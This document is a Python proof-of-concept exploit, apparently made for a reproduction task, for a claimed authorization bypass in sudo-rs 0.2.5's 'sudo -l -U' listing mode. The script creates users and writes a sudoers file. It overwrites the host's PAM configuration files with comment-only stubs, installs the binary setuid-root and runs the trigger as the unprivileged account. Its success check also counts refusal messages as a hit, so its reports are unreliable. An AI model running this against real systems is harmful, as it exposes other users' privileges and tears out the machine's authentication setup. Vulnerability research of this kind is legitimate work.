#!/usr/bin/env python3
"""PoC: sudo-rs 0.2.5 -U (list mode) authorization bypass.

Scenario
--------
The privileged sudo-rs binary supports ``sudo -l -U <user>``, which lists the
privileges of *another* user.  A self-listing (``sudo -l``) requires the
invoking user to authenticate through PAM or to match a sudoers rule; the
``-U`` variant performs no such check for the invoking user.  In this sudo-rs
release the ``-U`` path also skips the "is the invoking user allowed to run
'list' as <user>" authorization that sudo enforces, so any local user that can
invoke the setuid binary can dump the sudoers rules of any other account.

Concretely, with::

    invoker ALL=(ALL:ALL) NOPASSWD: /bin/true
    victim  ALL=(ALL:ALL) ALL

running ``sudo -l -U victim`` *as invoker* prints victim's rule
(``(ALL : ALL) ALL``) and exits 0, while the same query as root is refused
(``User victim is not allowed to run sudo``) -- the authorization for the
query is never evaluated for the invoking user, only for the target.

The script builds the whole scenario at runtime (accounts, sudoers file, PAM
service, setuid installation) and reports the single trigger invocation as a
JSON object.

Usage::

    python3 poc.py --binary /path/to/sudo [--json-out out.json] [--timeout 20]
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time

# Fixed system paths prescribed by the task; nothing host-specific beyond these.
SUDOERS_PATH = "/etc/sudoers-rs"
PAM_SERVICE_FILE = "/etc/pam.d/sudo"
PAM_OTHER_FILE = "/etc/pam.d/other"
PAM_CONF_FILE = "/etc/pam.conf"
INVOKER = "invoker"
VICTIM = "victim"
PAM_COMMENT = "# PoC: comment-only PAM service file (no module lines)\n"

# Exactly the content required by the task.
SUDOERS_CONTENT = (
    "invoker ALL=(ALL:ALL) NOPASSWD: /bin/true\n"
    "victim ALL=(ALL:ALL) ALL\n"
)

DEFAULT_TIMEOUT = 20.0


def log(msg: str) -> None:
    """Progress note on stderr so stdout stays a single JSON object."""
    print(f"[poc] {msg}", file=sys.stderr, flush=True)


def ensure_user(name: str) -> None:
    """Create ``name`` (with a home dir) if missing; otherwise reuse it."""
    entry = pwd_lookup(name)
    if entry is not None:
        log(f"reusing existing account {name} (uid {entry})")
        return
    run_quiet(["useradd", "-m", name], what=f"useradd -m {name}")


def pwd_lookup(name: str):
    """Return 'uid:gid' for ``name`` or None, using the pwd module when possible."""
    try:
        import pwd

        rec = pwd.getpwnam(name)
        return f"{rec.pw_uid}:{rec.pw_gid}"
    except Exception:
        result = subprocess.run(
            ["id", name], capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            return result.stdout.strip()
        return None


def run_quiet(cmd, what: str, timeout: float = 30.0) -> None:
    """Run a setup command, tolerating non-zero exit (idempotent best effort)."""
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
    except FileNotFoundError:
        raise SystemExit(f"[poc] required tool missing for {what}: {cmd[0]}")
    except subprocess.TimeoutExpired:
        raise SystemExit(f"[poc] timed out during {what}")
    if result.returncode != 0:
        err = (result.stderr or result.stdout or "").strip()
        # Tolerate failures that are benign for an already-configured box
        # (e.g. the account already exists), but surface the message.
        log(f"{what}: exit {result.returncode} ({err or 'no output'})")


def write_root_file(path: str, content: str, mode: int) -> None:
    """Write a root-owned file with an exact mode, replacing any prior copy."""
    with open(path, "w") as fh:
        fh.write(content)
    os.chown(path, 0, 0)
    os.chmod(path, mode)


def neutralize_pam() -> None:
    """Make PAM bootstrap succeed without loading any shared module."""
    # The tool must find /etc/pam.d/sudo; a comment-only service file is a valid
    # (empty) stack, so pam_start() succeeds and no .so is ever dlopen'ed.
    # The fallbacks get the same treatment so a missing service file cannot pull
    # in the system default stack either.
    for path in (PAM_SERVICE_FILE, PAM_OTHER_FILE, PAM_CONF_FILE):
        if not os.path.isdir(os.path.dirname(path)):
            os.makedirs(os.path.dirname(path), exist_ok=True)
        write_root_file(path, PAM_COMMENT, 0o644)
    log("PAM service and fallback files are comment-only")


def install_setuid(binary: str) -> str:
    """Copy the binary to a private root-owned location with mode 4755."""
    # 0755 on the directory: the unprivileged invoker must be able to traverse
    # into it to exec the setuid binary.
    dest_dir = tempfile.mkdtemp(prefix="poc-sudo-")
    os.chmod(dest_dir, 0o755)
    dest = os.path.join(dest_dir, "sudo")
    shutil.copy2(binary, dest)
    os.chown(dest, 0, 0)
    os.chmod(dest, 0o4755)
    log(f"installed setuid-root tool at {dest}")
    return dest


def run_trigger(tool: str, timeout: float):
    """The single trigger invocation: <tool> -l -U victim as invoker."""
    argv = ["-l", "-U", VICTIM]
    command = [tool] + argv
    log(f"running trigger as {INVOKER}: {' '.join(command)}")

    import pwd

    invoker_rec = pwd.getpwnam(INVOKER)
    home = invoker_rec.pw_dir if os.path.isdir(invoker_rec.pw_dir) else "/"

    env = {
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "HOME": home,
        "USER": INVOKER,
        "LOGNAME": INVOKER,
        "TERM": "dumb",
        "LANG": "C.UTF-8",
    }

    started = time.monotonic()
    timed_out = False
    proc = None
    try:
        proc = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout,
            env=env,
            cwd=home,
            user=invoker_rec.pw_uid,
            group=invoker_rec.pw_gid,
            extra_groups=[],
        )
    except subprocess.TimeoutExpired:
        timed_out = True
    except PermissionError as exc:
        return None, False, 0.0, f"cannot drop to {INVOKER}: {exc}"
    elapsed_ms = int(round((time.monotonic() - started) * 1000))
    return proc, timed_out, elapsed_ms, None


def describe_signal(proc):
    """Return (returncode, signal_name) accounting for negative exit codes."""
    if proc is None:
        return None, None
    rc = proc.returncode
    if rc is None or rc >= 0:
        return rc, None
    signum = -rc
    try:
        import signal as _signal

        name = _signal.Signals(signum).name
    except ValueError:
        name = f"SIG{signum}"
    return None, name


def observable_kind(stdout: str, stderr: str) -> str:
    """The evaluator-facing output kind of the combined invocation output."""
    text = (stdout + "\n" + stderr).strip()
    if not text:
        return "empty"
    lowered = text.lower()
    markers = (
        "may run the following commands",
        "not allowed to run sudo",
        "is not allowed to execute",
        "sudoers entry",
        "password",
        "i'm afraid i can't do that",
    )
    if any(m in lowered for m in markers):
        return "privilege-listing"
    if "usage:" in lowered:
        return "usage"
    if "not found" in lowered:
        return "error"
    return "other"


def main() -> int:
    parser = argparse.ArgumentParser(
        description="sudo-rs -U listing authorization bypass PoC"
    )
    parser.add_argument("--binary", required=True, help="path to the sudo binary")
    parser.add_argument(
        "--json-out", default=None, help="mirror the JSON result to this file"
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help="per-invocation timeout in seconds (default: %(default)s)",
    )
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)
    if not os.path.isfile(binary):
        result = {
            "binary": args.binary,
            "command": [binary, "-l", "-U", VICTIM],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {
                "kind": "error",
                "value": "",
                "path": SUDOERS_PATH,
            },
            "error": f"binary not found: {args.binary}",
        }
        emit(result, args.json_out)
        return 0

    if os.geteuid() != 0:
        log("warning: not running as root; scenario setup may fail")

    # 1. Accounts.
    ensure_user(INVOKER)
    ensure_user(VICTIM)

    # 2. Sudoers file (exact content, root-owned, mode 0440).
    write_root_file(SUDOERS_PATH, SUDOERS_CONTENT, 0o440)
    log(f"wrote {SUDOERS_PATH} (root:root, 0440)")

    # 3. PAM bootstrap without any shared module.
    neutralize_pam()

    # 4. Setuid-root installation of the tool.
    tool = install_setuid(binary)
    st = os.stat(tool)
    if not (st.st_uid == 0 and (st.st_mode & stat.S_ISUID)):
        result = fail(args.binary, tool, "setuid installation failed")
        emit(result, args.json_out)
        return 0

    # 5. Trigger: -l -U victim as invoker, no command argument.
    proc, timed_out, runtime_ms, err = run_trigger(tool, args.timeout)

    if proc is not None:
        stdout = proc.stdout or ""
        stderr = proc.stderr or ""
        returncode, signal_name = describe_signal(proc)
        error = None
    else:
        stdout = ""
        stderr = ""
        returncode, signal_name = None, None
        error = err

    combined = (stdout + stderr).rstrip("\n")
    result = {
        "binary": args.binary,
        "command": [tool, "-l", "-U", VICTIM],
        "returncode": returncode,
        "signal": signal_name,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
        "observable": {
            "kind": observable_kind(stdout, stderr),
            "value": combined,
            "path": SUDOERS_PATH,
        },
        "error": error,
    }

    emit(result, args.json_out)
    return 0


def fail(binary_value: str, tool: str, message: str) -> dict:
    return {
        "binary": binary_value,
        "command": [tool, "-l", "-U", VICTIM],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "error", "value": "", "path": SUDOERS_PATH},
        "error": message,
    }


def emit(result: dict, json_out) -> None:
    """Print the single JSON object to stdout and mirror it if requested."""
    text = json.dumps(result, indent=2)
    print(text)
    if json_out:
        with open(json_out, "w") as fh:
            fh.write(text + "\n")


if __name__ == "__main__":
    sys.exit(main())
